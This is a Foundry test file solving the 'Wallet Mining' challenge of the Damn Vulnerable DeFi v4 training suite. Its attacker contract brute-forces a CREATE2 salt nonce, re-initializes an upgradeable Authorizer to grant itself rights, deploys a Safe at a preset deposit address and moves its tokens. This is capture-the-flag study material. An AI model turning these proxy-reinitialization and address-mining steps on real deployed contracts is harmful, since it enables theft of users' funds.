
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS =
        0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (user, userPrivateKey) = makeAddrAndKey("user");

        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);

        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);

        assertEq(
            CREATEX_ADDRESS.codehash,
            CREATEX_CODEHASH,
            "Unexpected CreateX code"
        );

        startHoax(deployer);

        token = new DamnValuableToken();

        address[] memory wards = new address[](1);
        wards[0] = ward;

        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );

        authorizer = AuthorizerUpgradeable(
            authorizerFactory.deployWithProxy(wards, aims, upgrader)
        );

        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(
                bytes.concat(bytes32(""), type(Safe).creationCode)
            );

        singletonCopy = Safe(
            payable(address(uint160(bytes20(returndata))))
        );

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(
                bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode)
            );

        proxyFactory = SafeProxyFactory(
            address(uint160(bytes20(returndata)))
        );

        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(
                        address(token),
                        address(proxyFactory),
                        address(singletonCopy),
                        deployer
                    )
                )
            })
        );

        walletDeployer.rule(address(authorizer));

        initialWalletDeployerTokenBalance = walletDeployer.pay();

        token.transfer(
            address(walletDeployer),
            initialWalletDeployerTokenBalance
        );

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertNotEq(address(authorizer), address(0));

        assertEq(
            TransparentProxy(payable(address(authorizer))).upgrader(),
            upgrader
        );

        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        assertEq(
            address(walletDeployer.cook()).code,
            type(SafeProxyFactory).runtimeCode,
            "bad cook code"
        );

        assertEq(
            walletDeployer.cpy().code,
            type(Safe).runtimeCode,
            "no copy code"
        );

        assertEq(
            token.balanceOf(USER_DEPOSIT_ADDRESS),
            DEPOSIT_TOKEN_AMOUNT
        );

        assertGt(initialWalletDeployerTokenBalance, 0);

        assertEq(
            token.balanceOf(address(walletDeployer)),
            initialWalletDeployerTokenBalance
        );

        assertEq(token.balanceOf(player), 0);
    }

    /**
     * SOLUTION
     */
    function test_walletMining() public checkSolvedByPlayer {
        WalletMiningAttacker attacker = new WalletMiningAttacker(
            token,
            authorizer,
            walletDeployer,
            proxyFactory,
            singletonCopy,
            user,
            userPrivateKey
        );

        attacker.run(ward);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertNotEq(
            address(walletDeployer.cook()).code.length,
            0,
            "No code at factory address"
        );

        assertNotEq(
            walletDeployer.cpy().code.length,
            0,
            "No code at copy address"
        );

        assertNotEq(
            USER_DEPOSIT_ADDRESS.code.length,
            0,
            "No code at user's deposit address"
        );

        assertEq(
            token.balanceOf(USER_DEPOSIT_ADDRESS),
            0,
            "User's deposit address still has tokens"
        );

        assertEq(
            token.balanceOf(address(walletDeployer)),
            0,
            "Wallet deployer contract still has tokens"
        );

        assertEq(vm.getNonce(user), 0, "User executed a tx");
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        assertEq(
            token.balanceOf(user),
            DEPOSIT_TOKEN_AMOUNT,
            "Not enough tokens in user's account"
        );

        assertEq(
            token.balanceOf(ward),
            initialWalletDeployerTokenBalance,
            "Not enough tokens in ward's account"
        );
    }
}

/**
 * ATTACKER CONTRACT
 */
contract WalletMiningAttacker is Test {
    address constant USER_DEPOSIT_ADDRESS =
        0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;

    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    address user;
    uint256 userPrivateKey;

    address immutable OWNER;

    constructor(
        DamnValuableToken _token,
        AuthorizerUpgradeable _authorizer,
        WalletDeployer _walletDeployer,
        SafeProxyFactory _proxyFactory,
        Safe _singletonCopy,
        address _user,
        uint256 _userPrivateKey
    ) {
        token = _token;
        authorizer = _authorizer;
        walletDeployer = _walletDeployer;
        proxyFactory = _proxyFactory;
        singletonCopy = _singletonCopy;
        user = _user;
        userPrivateKey = _userPrivateKey;

        OWNER = msg.sender;
    }

    /**
     * Calculate the initializer and recover the CREATE2 nonce.
     */
    function calculateNonce()
        public
        view
        returns (uint256 nonce, bytes memory initializer)
    {
        address[] memory owners = new address[](1);
        owners[0] = user;

        initializer = abi.encodeWithSelector(
            singletonCopy.setup.selector,
            owners,
            1,
            address(0),
            "",
            address(0),
            address(0),
            0,
            payable(address(0))
        );

        for (uint256 i = 0; i < type(uint256).max; i++) {
            if (
                predictProxyAddress(initializer, i)
                    == USER_DEPOSIT_ADDRESS
            ) {
                return (i, initializer);
            }
        }

        revert("Nonce not found");
    }

    /**
     * Predict the Safe proxy address using CREATE2.
     */
    function predictProxyAddress(
        bytes memory initializer,
        uint256 saltNonce
    ) public view returns (address) {
        bytes32 salt = keccak256(
            abi.encodePacked(keccak256(initializer), saltNonce)
        );

        bytes memory deploymentData = abi.encodePacked(
            type(SafeProxy).creationCode,
            abi.encode(address(singletonCopy))
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(proxyFactory),
                salt,
                keccak256(deploymentData)
            )
        );

        return address(uint160(uint256(hash)));
    }

    /**
     * Sign and execute the Safe transaction.
     */
    function signTransactionAndTransfer() private {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));

        uint256 safeNonce = safe.nonce();

        bytes memory data = abi.encodeWithSelector(
            token.transfer.selector,
            user,
            DEPOSIT_TOKEN_AMOUNT
        );

        bytes32 txHash = safe.getTransactionHash(
            address(token),
            0,
            data,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            address(0),
            safeNonce
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            userPrivateKey,
            txHash
        );

        bytes memory signature = abi.encodePacked(r, s, v);

        safe.execTransaction(
            address(token),
            0,
            data,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signature
        );
    }

    /**
     * Execute the complete attack.
     */
    function run(address ward) external {
        require(msg.sender == OWNER, "Not owner");

        // 1. Find the missing CREATE2 nonce.
        (uint256 nonce, bytes memory initializer) = calculateNonce();

        // 2. Reinitialize the Authorizer and authorize this contract.
        address[] memory wards = new address[](1);
        wards[0] = address(this);

        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        authorizer.init(wards, aims);

        // 3. Deploy the Safe at the predetermined address.
        require(
            walletDeployer.drop(
                USER_DEPOSIT_ADDRESS,
                initializer,
                nonce
            ),
            "Wallet deployment failed"
        );

        // 4. Transfer all DVT from the Safe to the intended user.
        signTransactionAndTransfer();

        // 5. Forward the WalletDeployer reward to ward.
        token.transfer(
            ward,
            token.balanceOf(address(this))
        );
    }
}
